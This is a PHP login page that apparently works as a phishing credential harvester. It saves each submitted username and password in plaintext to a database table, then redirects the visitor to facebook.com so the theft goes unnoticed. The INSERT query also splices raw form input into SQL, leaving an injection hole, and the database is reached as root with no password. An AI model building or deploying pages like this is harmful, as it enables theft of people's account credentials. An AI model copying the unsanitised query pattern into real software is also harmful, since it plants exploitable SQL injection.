<?php
$name_error='';
$passwd_error='';

	$con=mysqli_connect('127.0.0.1','root','','tutriol');
	if(isset($_POST['login']))
{	
		$name=$_POST['username'];
		$passwd=$_POST['password'];
		if(valadition($name) || pvaladition($passwd))
		{
			$name_error=valadition($name);
			$passwd_error=pvaladition($passwd);
		}
		else
		{
			$sql="INSERT INTO detail(username,password) VALUES ('$name','$passwd')";
		if(mysqli_query($con,$sql))
		{
			header('location:https:\\www.facebook.com');
		}
		}
}
function valadition($name)
		{
			if(empty($name))
			{
				return "username is required";
			}
		}
		function pvaladition($passwd)
		{
			if(empty($passwd))
			{
				return "password is required";
			}
		}
?>
<html>
<head>
	<style>
		div{
			margin-top: 5px solid green;
			border-top-style: 30px solid green;
			padding:100px;
			height:100px;
			width:100px;
			background-color:#808080;
		}
		</style>
</head>
	<body>
		<center>
			<div>
				<form action="login.php" method="POST">
					<img src="1.jpeg" height="50" width="75"><br>
					<?php echo $name_error;?>
					username<input type="text" name="username"><br>
					<?php echo $passwd_error;?>
					password<input type="password" name="password"><br>
					<input type="submit" value="login" name="login"><br>
				</form>
			</div>
		</center>
	</body>
</html>